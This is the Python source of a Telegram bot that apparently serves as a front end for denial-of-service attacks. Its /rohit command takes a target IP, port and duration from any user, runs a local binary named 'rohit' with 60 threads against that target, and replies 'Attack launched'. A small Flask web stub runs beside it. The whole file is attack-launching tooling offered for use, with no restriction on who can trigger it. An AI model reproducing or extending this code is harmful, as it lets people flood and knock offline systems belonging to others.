import os
from telebot import TeleBot
import logging
import subprocess
import time
from threading import Thread
from flask import Flask

# Configuration



# Fetch token from the environment
TOKEN = os.getenv("TELEBOT_TOKEN")
if not TOKEN:
    raise ValueError("Bot token is not set in environment")

bot = TeleBot(TOKEN)


# Logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

THREAD_COUNT = 60  # Fixed thread count

# Function to execute the binary
def run_rohit_binary(ip, port, duration):
    try:
        # Command to execute binary with given arguments
        command = ["./rohit", ip, str(port), str(duration), str(THREAD_COUNT)]
        subprocess.run(command, check=True)
        logging.info(f"Executed binary with: {command}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Binary execution failed: {e}")
        raise e

# Command handler for /rohit
@bot.message_handler(commands=['rohit'])
def handle_rohit_command(message):
    bot.send_message(message.chat.id, "*Provide the target IP, port, and duration.*\nFormat: `IP PORT DURATION`", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_rohit_command)

def process_rohit_command(message):
    try:
        # Parse the user input
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "Invalid format. Use: `IP PORT DURATION`", parse_mode='Markdown')
            return

        # Extract IP, port, and duration
        target_ip = args[0]
        target_port = int(args[1])
        duration = int(args[2])

        # Run the binary
        run_rohit_binary(target_ip, target_port, duration)
        bot.send_message(message.chat.id, f"Attack launched on {target_ip}:{target_port} for {duration} seconds with {THREAD_COUNT} threads!", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", parse_mode='Markdown')
        logging.error(f"Error in /rohit command: {e}")

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.send_message(message.chat.id, "Commands:\n`/rohit IP PORT DURATION` - Launch attack using the rohit binary.\n`/help` - Show this message.", parse_mode='Markdown')

# Flask app
app = Flask(__name__)

@app.route('/')
def hello_world():
    return "Hello, World!"

# Main function
if __name__ == '__main__':
    # Start Flask app in a separate thread
    flask_thread = Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 5000}, daemon=True)
    flask_thread.start()

    logging.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        time.sleep(1)
